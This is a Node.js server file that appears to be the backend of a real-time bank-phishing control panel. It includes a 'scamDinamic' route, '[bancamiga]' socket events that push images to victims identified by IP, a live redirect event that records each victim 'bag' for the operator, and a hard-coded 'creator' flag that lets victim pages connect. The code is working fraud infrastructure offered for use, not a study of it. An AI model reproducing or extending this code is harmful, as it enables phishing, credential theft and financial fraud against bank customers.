import { createServer } from 'http'

import morgan from 'morgan';
import cors  from 'cors'
import { Server } from 'socket.io'
import express  from 'express'
import 'dotenv/config'

import { connectdb } from './db/connectdb.mjs'
import { verifyToken } from './utils/verifyToken.mjs'
import { userConnect, userDisconnect } from './utils/connectedUser.mjs'

import { getBagForById } from './controllers/bag/getBagForById.mjs'
import { bagCreateController } from './controllers/sockets/bag/bagCreateController.mjs'
import { bagDisconnectController } from './controllers/sockets/bag/bagDisconnectController.mjs'

// routes
import authRoute from './routes/authRoute.mjs';
import scamDinamicRoute from './routes/ScamDinamic/scamDinamicRoute.mjs';
import { getBagForByIp } from './controllers/bag/getBagForId.mjs';
import { bagConnected } from './controllers/bag/bagConnected.mjs';
import { createBagId } from './controllers/bag/createBagId.mjs';
import { createBagIp } from './controllers/bag/createBagIp.mjs';

const app = express()

app.use(cors({origin: '*'}))
app.use(express.json())
app.use(morgan('dev'))

connectdb()

const httpServer = createServer(app)
export const io = new Server(httpServer, { 
    cors: '*' 
})


app.use(express.static('public'))
app.post('/', (req, res) => res.json('test'))
app.use('/auth', authRoute )
app.use('/scamDinamic', scamDinamicRoute)


io.on('connection', async(socket) => {    
    
    if(
        socket.handshake.headers.origin === ('http://localhost:3000') 
        || socket.handshake.headers.origin === ('https://huggopanel.com') 
    ) {
        try {
            const [valido, id] = await verifyToken({token: socket.handshake?.query['x-token']})
            
            if(valido == false){
                console.log('socket no identificado')
                socket.emit('[user] logout')
                return socket.disconnect()
            }

            await userConnect({ id })
            await socket.join(id)
    
            if([...socket.rooms].includes(id)) {
                const users = await getBagForById({id})
                socket.emit('[bag] getBag', users)

                socket.on('[bancamiga] getImage', ({ip = '', image = ''}) => {
                    if(ip == '') return
                    console.log('first')
                    io.to(ip).emit('[bancamiga] sendImage', {image})
                    return io.to(ip).emit('[bancamiga] sendImage', {image})
                })

                socket.on('[bancamiga] getListImage', ({ip = '', listImage = ''}) => {
                    if(ip == '') return
                    return io.to(ip).emit('[bancamiga] sendListImage', {listImage})
                })

                socket.on('[live] panelSendRedirect', async({ip, urlPage, errorBag}) => {
                    const bag = await createBagIp({ip})
                    io.to(bag?.userRef?.toString()).emit('[bag] newBag', bag)
                    return socket.broadcast.to(ip).emit('[live] bagWaitRedirect', {urlPage, errorBag})
                })
            }

            socket.on('disconnect', async() => {
                await userDisconnect({id})
                return socket.leave(id)
            })
        } catch (error) {
            console.log(error)
        }
    } 
    


    if(socket.handshake?.query['creator'] == 'nadiemejode'){
        
        const ip = socket.handshake?.query['ip']

        if(ip == '') return socket.disconnect()
        socket.on('[bag] create', async (bag) => await bagCreateController({bag, socket}))
        if(ip) await socket.join(ip)
        if([...socket.rooms].includes(ip) && ip != '') { await bagConnected({ip, socket}) }


        socket.on('disconnect', async() => {
            await bagDisconnectController({socket})
            return socket.leave(ip)
        }) 

    }
    
})

// seed(1000)

httpServer.listen(3001, () => console.log(`conectado al servidor ${3001}`) )



